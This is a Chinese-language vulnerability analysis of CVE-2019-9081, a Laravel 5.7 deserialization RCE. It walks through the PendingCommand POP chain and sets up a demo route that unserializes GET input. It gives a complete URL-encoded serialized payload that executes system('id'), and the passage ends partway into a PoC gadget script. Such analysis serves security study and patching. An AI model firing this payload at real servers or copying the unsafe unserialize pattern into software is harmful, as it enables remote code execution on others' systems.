<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-9081laravel-57-反序列化rce"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-9081</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Laravel 5.7 </span><span class="csECDA2D3">反序列化</span><span class="csDE05BCC">rce</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Laravel Framework 5.7.x</span><span class="cs9C1B1871">版本中的</span><span class="cs8926E06">Illuminate</span><span class="cs9C1B1871">组件存在安全漏洞。远程攻击者可利用该漏洞执行代码。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Laravel 5.7</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<h5 class="cs868C439D">
			<a name="漏洞demo"><span class="cs1C2E50E7">漏洞</span><span class="cs4B51D5E4">demo</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">由于我没有找到</span><span class="cs8926E06">laravel</span><span class="cs9C1B1871">框架触发反序列化的点，因此我们需要自己构造一个漏洞</span><span class="cs8926E06">demo</span><span class="cs9C1B1871">，用作</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">的验证。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">routes/web.php</span><span class="cs9C1B1871">文件中添加这样一条路由记录</span><span class="cs8926E06">:</span><span class="cs9FB05234">Route::get(&#39;/index&#39;, &#39;TaskController@index&#39;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来在</span><span class="cs9FB05234">app/Http/Controllers</span><span class="cs9C1B1871">文件夹下创建文件</span><span class="cs9FB05234">TaskController.php</span><span class="cs9C1B1871">，源码如下</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">namespace App\Http\Controllers;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class TaskController</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function index(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unserialize($_GET[&#39;p&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &quot;22222&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先我们来对比一下</span><span class="cs8926E06">laravel v5.6</span><span class="cs9C1B1871">和</span><span class="cs8926E06">laravel v5.7</span><span class="cs9C1B1871">下</span><span class="cs9FB05234">vendor/laravel/framework/src/Illuminate/Foundation/Testing</span><span class="cs9C1B1871">文件夹中的区别：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image0.png" width="560" height="345" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image1.png" width="560" height="325" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到在</span><span class="cs8926E06">v5.7</span><span class="cs9C1B1871">版本中多了一个</span><span class="cs9FB05234">PendingCommand.php</span><span class="cs9C1B1871">文件。我们再来看看官方文档对于这个文件的解释。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image2.png" width="560" height="369" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其主要功能是用作命令执行，并且获取输出内容。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">阅读代码我们可以看到</span><span class="cs9FB05234">PendingCommand.php</span><span class="cs9C1B1871">文件定义了</span><span class="cs9FB05234">PendingCommand</span><span class="cs9C1B1871">类，该类存在</span><span class="cs9FB05234">__destruct</span><span class="cs9C1B1871">方法，忘了哪位大牛说过，</span><span class="cs9FB05234">__destruct</span><span class="cs9C1B1871">永远是反序列化漏洞的最佳攻击点。而在</span><span class="cs9FB05234">PendingCommand</span><span class="cs9C1B1871">类的</span><span class="cs9FB05234">__destruct</span><span class="cs9C1B1871">方法中调用了该类的</span><span class="cs9FB05234">run</span><span class="cs9C1B1871">方法。在</span><span class="cs9FB05234">run</span><span class="cs9C1B1871">方法的头顶，赫然写着</span><span class="cs9FB05234">Execute the command.</span><span class="cs9C1B1871">。攻击思路很明显了，通过反序列化触发</span><span class="cs9FB05234">PendingCommand</span><span class="cs9C1B1871">类的</span><span class="cs9FB05234">__destruct</span><span class="cs9C1B1871">析构函数，进而调用其</span><span class="cs9FB05234">run</span><span class="cs9C1B1871">方法实现代码执行。接下来就要开始构造</span><span class="cs8926E06">pop</span><span class="cs9C1B1871">链。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在构造</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">之前，我先简单的介绍一下</span><span class="cs9FB05234">PendingCommand</span><span class="cs9C1B1871">类中的几个重要属性：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$this-&gt;app; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">一个实例化的类</span><span class="cs9FB05234"> Illuminate\Foundation\Application</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$this-&gt;test; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">一个实例化的类</span><span class="cs9FB05234"> Illuminate\Auth\GenericUser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$this-&gt;command; &nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">要执行的</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">函数</span><span class="cs9FB05234"> system</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$this-&gt;parameters; &nbsp;//</span><span class="cs7FFD2630">要执行的</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">函数的参数</span><span class="cs9FB05234"> &nbsp;array(&#39;id&#39;)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们传入</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">看看具体流程走向。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image3.png" width="560" height="384" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将我们构造好的序列化数据通过参数</span><span class="cs8926E06">p</span><span class="cs9C1B1871">传入，查看调用栈可以看到，在进行反序列化时，成功进入</span><span class="cs9FB05234">PendingCommand</span><span class="cs9C1B1871">类的析构函数。并且这里的</span><span class="cs9FB05234">$this-&gt;hasExecuted</span><span class="cs9C1B1871">默认定义就是</span><span class="cs8926E06">false</span><span class="cs9C1B1871">。导致我们很顺利进入</span><span class="cs9FB05234">$this-&gt;run()</span><span class="cs9C1B1871">方法。</span><span class="cs9FB05234">run</span><span class="cs9C1B1871">方法的代码如下</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image4.png" width="560" height="279" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们首先需要进入</span><span class="cs9FB05234">$this-&gt;mockConsoleOutput()</span><span class="cs9C1B1871">方法。这个方法的也是困扰了我很久，差一点没能绕过这个方法。最后是在吃完晚饭之后，灵光一现突然想到</span><span class="cs8926E06">bypass</span><span class="cs9C1B1871">的方法。我们跟进看看代码逻辑。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image5.png" width="560" height="316" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">$this-&gt;mockConsoleOutput()</span><span class="cs9C1B1871">使用</span><span class="cs9FB05234">Mockery::mock</span><span class="cs9C1B1871">实现对象模拟，具体如何实现我们不去关心，目前的首要任务是顺利走通这段代码。我们将关注点放在</span><span class="cs9FB05234">$this-&gt;createABufferedOutputMock()</span><span class="cs9C1B1871">，继续跟进</span><span class="cs9FB05234">$this-&gt;createABufferedOutputMock()</span><span class="cs9C1B1871">函数。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image6.png" width="560" height="325" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里又进行一次对象模拟，但是着不重要，我们重点看我打上箭头的地方。要求获取</span><span class="cs9FB05234">$this-&gt;test</span><span class="cs9C1B1871">这个类中的</span><span class="cs9FB05234">expectedOutput</span><span class="cs9C1B1871">属性，并且遍历该属性。按道理来说</span><span class="cs9FB05234">$this-&gt;test</span><span class="cs9C1B1871">这个类应该存在</span><span class="cs9FB05234">expectedOutput</span><span class="cs9C1B1871">属性，我们才能顺利地执行下文代码。很不幸，在我们可以实例化的类中，没有一个类存在</span><span class="cs9FB05234">expectedOutput</span><span class="cs9C1B1871">属性。只有一些测试类才有这个属性。这也是困扰我很久的地方。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但我们仔细看看这段代码会发现，我们需要的只是一个返回内容而已，只需要有返回内容，使得代码进入循环流程我们便能走通这段代码。因此我们可以利用</span><span class="cs9FB05234">__get</span><span class="cs9C1B1871">魔术方法来返回我们需要的内容。我这里选取的是</span><span class="cs9FB05234">Illuminate\Auth\GenericUser</span><span class="cs9C1B1871">类。其</span><span class="cs9FB05234">__get</span><span class="cs9C1B1871">魔术方法的逻辑如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image7.png" width="560" height="320" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而</span><span class="cs9FB05234">$this-&gt;attributes</span><span class="cs9C1B1871">通过反序列化是可控的，因此我们可以构造</span><span class="cs9FB05234">$this-&gt;attributes</span><span class="cs9C1B1871">键名为</span><span class="cs9FB05234">expectedOutput</span><span class="cs9C1B1871">的数组。这样一来</span><span class="cs9FB05234">$this-&gt;test-&gt;expectedOutput</span><span class="cs9C1B1871">就会返回</span><span class="cs9FB05234">$this-&gt;attributes</span><span class="cs9C1B1871">中键名为</span><span class="cs9FB05234">expectedOutput</span><span class="cs9C1B1871">的数组。</span><span class="cs9FB05234">$this-&gt;createABufferedOutputMock()</span><span class="cs9C1B1871">的代码也就顺利走通了。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image8.png" width="560" height="339" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来回到</span><span class="cs9FB05234">$this-&gt;mockConsoleOutput()</span><span class="cs9C1B1871">方法，可以看到这里有一段和</span><span class="cs9FB05234">$this-&gt;createABufferedOutputMock()</span><span class="cs9C1B1871">中相似的代码，我们的目的只是走通这段代码，进入下面的流程，因此不需要关心他具体的实现，只要能顺利执行，不报错，不产生异常就行。使用和</span><span class="cs9FB05234">$this-&gt;createABufferedOutputMock()</span><span class="cs9C1B1871">同样的绕过办法，在</span><span class="cs9FB05234">$this-&gt;attributes</span><span class="cs9C1B1871">中定义键名为</span><span class="cs9FB05234">expectedQuestions</span><span class="cs9C1B1871">的数组即可。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image9.png" width="560" height="335" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后，我们继续运行就能走出</span><span class="cs9FB05234">$this-&gt;mockConsoleOutput()</span><span class="cs9C1B1871">方法。接下来，就是最关键的产生漏洞的代码点。</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这行代码相当令人费解，我为了更加直观的表述，新增两个变量。</span></p><p class="cs3A447A38"><span class="cs9FB05234">$aaa=Kernel::class;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$fff=$this-&gt;app[Kernel::class];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">Kernel::class</span><span class="cs9C1B1871">在这里是一个固定值</span><span class="cs9FB05234">Illuminate\Contracts\Console\Kernel</span><span class="cs9C1B1871">，我们不去管他。重点是</span><span class="cs9FB05234">$this-&gt;app[Kernel::class]</span><span class="cs9C1B1871">这句代码。跟踪这句代码，我们会得到以下调用栈：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image10.png" width="560" height="328" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过整体跟踪，猜测开发者的本意应该是实例化</span><span class="cs9FB05234">Illuminate\Contracts\Console\Kernel</span><span class="cs9C1B1871">这个类，但是在</span><span class="cs9FB05234">getConcrete</span><span class="cs9C1B1871">这个方法中出了问题，导致可以利用</span><span class="cs8926E06">php</span><span class="cs9C1B1871">的反射机制实例化任意类。问题出在</span><span class="cs9FB05234">vendor/laravel/framework/src/Illuminate/Container/Container.php</span><span class="cs9C1B1871">的</span><span class="cs8926E06">704</span><span class="cs9C1B1871">行，可以看到这里判断</span><span class="cs9FB05234">$this-&gt;bindings[$abstract])</span><span class="cs9C1B1871">是否存在，若存在则返回</span><span class="cs9FB05234">$this-&gt;bindings[$abstract][&#39;concrete&#39;]</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">$bindings</span><span class="cs9C1B1871">是</span><span class="cs9FB05234">vendor/laravel/framework/src/Illuminate/Container/Container.php</span><span class="cs9C1B1871">文件中</span><span class="cs9FB05234">Container</span><span class="cs9C1B1871">类中的属性。因此我们只要寻找一个继承自</span><span class="cs9FB05234">Container</span><span class="cs9C1B1871">的类，即可通过反序列化控制</span><span class="cs8926E06"> </span><span class="cs9FB05234">$this-&gt;bindings</span><span class="cs9C1B1871">属性。而</span><span class="cs9FB05234">Illuminate\Foundation\Application</span><span class="cs9C1B1871">恰好继承自</span><span class="cs9FB05234">Container</span><span class="cs9C1B1871">类，这就是我选择</span><span class="cs9FB05234">Illuminate\Foundation\Application</span><span class="cs9C1B1871">对象放入</span><span class="cs9FB05234">$this-&gt;app</span><span class="cs9C1B1871">的原因。由于我们已知</span><span class="cs9FB05234">$abstract</span><span class="cs9C1B1871">变量为</span><span class="cs9FB05234">Illuminate\Contracts\Console\Kernel</span><span class="cs9C1B1871">，所以我们只需通过反序列化定义</span><span class="cs9FB05234">Illuminate\Foundation\Application</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">$bindings</span><span class="cs9C1B1871">属性存在键名为</span><span class="cs9FB05234">Illuminate\Contracts\Console\Kernel</span><span class="cs9C1B1871">的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是</span><span class="cs9FB05234">Illuminate\Foundation\Application</span><span class="cs9C1B1871">类。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image11.png" width="560" height="330" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后便步出</span><span class="cs9FB05234">$this-&gt;getConcrete</span><span class="cs9C1B1871">方法。使用</span><span class="cs9FB05234">$this-&gt;isBuildable</span><span class="cs9C1B1871">方法，判断是否可进行实例化。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image12.png" width="560" height="367" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">具体判断逻辑如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image13.png" width="560" height="264" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">很明显我们现在不满足条件，因此进入</span><span class="cs9FB05234">$this-&gt;make</span><span class="cs9C1B1871">方法，同样的流程再循环一遍。第二遍循环时，在</span><span class="cs9FB05234">$this-&gt;getConcrete</span><span class="cs9C1B1871">环节还是获取我们定义的</span><span class="cs9FB05234">Illuminate\Foundation\Application</span><span class="cs9C1B1871">，这样一来使得</span><span class="cs9FB05234">$this-&gt;isBuildable</span><span class="cs9C1B1871">中的</span><span class="cs9FB05234">$concrete === $abstract</span><span class="cs9C1B1871">条件成立。因此我们进入</span><span class="cs9FB05234">$this-&gt;build</span><span class="cs9C1B1871">方法。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image14.png" width="560" height="380" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">$this-&gt;build</span><span class="cs9C1B1871">方法中，就能看到使用</span><span class="cs9FB05234">ReflectionClass</span><span class="cs9C1B1871">反射机制，实例化我们传入的类。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image15.png" width="560" height="358" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">成功实例化类，最后逐层返回我们创建的对象。最后我们可以知道通过我们传入的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">$this-&gt;app[Kernel::class]</span><span class="cs9C1B1871">最终返回的内容就是我们创建的</span><span class="cs9FB05234">Illuminate\Foundation\Application</span><span class="cs9C1B1871">类的对象。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image16.png" width="560" height="415" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image17.png" width="560" height="326" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续往下跟踪，已经接近胜利了。在返回一个对象之后，又调用了</span><span class="cs9FB05234">call</span><span class="cs9C1B1871">方法。实际上</span><span class="cs9FB05234">Illuminate\Foundation\Application</span><span class="cs9C1B1871">类没有</span><span class="cs9FB05234">call</span><span class="cs9C1B1871">方法，但是它的父类</span><span class="cs9FB05234">Illuminate\Container\Container</span><span class="cs9C1B1871">是有</span><span class="cs9FB05234">call</span><span class="cs9C1B1871">方法的。因此，在这里会直接跳转到</span><span class="cs9FB05234">Illuminate\Container\Container</span><span class="cs9C1B1871">类中的</span><span class="cs9FB05234">call</span><span class="cs9C1B1871">方法。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image18.png" width="560" height="376" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs9FB05234">BoundMethod</span><span class="cs9C1B1871">对象的</span><span class="cs9FB05234">call</span><span class="cs9C1B1871">方法。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image19.png" width="560" height="393" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不满足第一个分支语句，直接进入第二行。前面的</span><span class="cs9FB05234">static::callBoundMethod</span><span class="cs9C1B1871">只是判断我们的</span><span class="cs9FB05234">$callback</span><span class="cs9C1B1871">是否为数组。这个不重要，我们关注后面的匿名函数。这个匿名函数直接调用</span><span class="cs9FB05234">call_user_func_array</span><span class="cs9C1B1871">，并且第一个参数我们可控，参数值为</span><span class="cs9FB05234">system</span><span class="cs9C1B1871">，第二个参数由</span><span class="cs9FB05234">static::getMethodDependencies</span><span class="cs9C1B1871">方法返回。跟进</span><span class="cs9FB05234">static::getMethodDependencies</span><span class="cs9C1B1871">方法看看。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image20.png" width="560" height="306" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">static::getCallReflector($callback)</span><span class="cs9C1B1871">这句用于利用反射获取</span><span class="cs9FB05234">$callback</span><span class="cs9C1B1871">的对象，继续往下执行</span><span class="cs9FB05234">static::addDependencyForCallParameter</span><span class="cs9C1B1871">，会对</span><span class="cs9FB05234">$callback</span><span class="cs9C1B1871">的对象添加一些参数，但是这些不重要。最后一行才是关键。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后将我们传入的</span><span class="cs9FB05234">$parameters</span><span class="cs9C1B1871">参数数组和</span><span class="cs9FB05234">$dependencies</span><span class="cs9C1B1871">数组合并，</span><span class="cs9FB05234">$dependencies</span><span class="cs9C1B1871">数组为空。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后在</span><span class="cs9FB05234">BoundMethod</span><span class="cs9C1B1871">对象的</span><span class="cs9FB05234">call</span><span class="cs9C1B1871">方法中我们相当于执行了以下代码</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">call_user_func_array(&#39;system&#39;,array(&#39;id&#39;))</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时</span><span class="cs8926E06">run</span><span class="cs9C1B1871">函数中</span><span class="cs8926E06">$exitcode</span><span class="cs9C1B1871">值即为命令的执行结果</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image21.png" width="560" height="192" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">payload</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://www.0-sec.org/laravel-5.7/public/index.php/index?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Laravel/%ef%bc%88CVE-2019-9081%ef%bc%89Laravel%205.7%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image22.png" width="560" height="280" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">POC</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//gadgets.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">namespace Illuminate\Foundation\Testing{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;class PendingCommand{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected $command;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected $parameters;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected $app;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public $test;</span><span 